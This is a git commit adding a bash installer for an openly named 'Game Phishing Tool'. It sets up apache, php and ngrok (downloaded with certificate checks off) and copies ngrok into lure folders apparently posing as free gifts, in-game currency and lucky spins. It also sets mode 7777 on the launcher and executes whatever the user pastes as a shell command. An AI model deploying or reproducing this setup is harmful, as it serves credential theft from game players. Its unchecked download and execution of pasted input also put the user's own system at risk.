b477730f0d0bd5c65955902dcc03f395e706f79d
HACKERYASH <86007164+HACKERYASH@users.noreply.github.com>
2021-06-16 20:14:33 +0530

    Create Linux-Setup.sh

---
+++ Linux-Setup.sh
@@ -0,0 +1,64 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
+sleep 2
+clear
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Game Phishing Tool Please Wait....  \e[0m"
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
+echo ""
+echo ""
+sudo apt-get install apache2 -y
+apt install php -y
+apt install tail -y
+apt install curl -y
+systemctl start apache2
+apt install ruby -y
+apt-get install ruby -y
+apt install gem -y
+gem install lolcat
+apt install gnome-terminal -y
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
+unzip ngrok-stable-linux-amd64.zip
+cp -R ngrok OnlineHacking/secnhack phs/BonusChallenge-Free-Gift-OH/
+cp -R ngrok OnlineHacking/secnhack phs/Free-UC-Buy-OH/
+cp -R ngrok OnlineHacking/secnhack phs/Lucky-Spin-OH/
+chmod 7777 OnlineHacking-Phishing.sh
+clear
+echo ""
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo " "
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m \e[1;33m[ *** ]\e[0m'
+echo ""
+read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Paste Your Ngrok Token [\e[31mEx \e[32m./ngrok authtoken\e[0m ] : \e[0m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+clear
+echo
+echo -e "\e[92m[+] Setting up Online Hacking Game Tool  \e[m "
+echo 
+###########XXXXXXXXXXXXX####################
+#     JUST LEARNING KEEP SUPPORTING        #
+############XXXXXXXXXXXX####################
+echo -e "\e[92m[+] To run the tool from anywhere simply type :\e[93m ./OnlineHacking-Phishing.sh \e[m "
+echo 
+#####################################
+#           THANKYOU                #
+#####################################
+
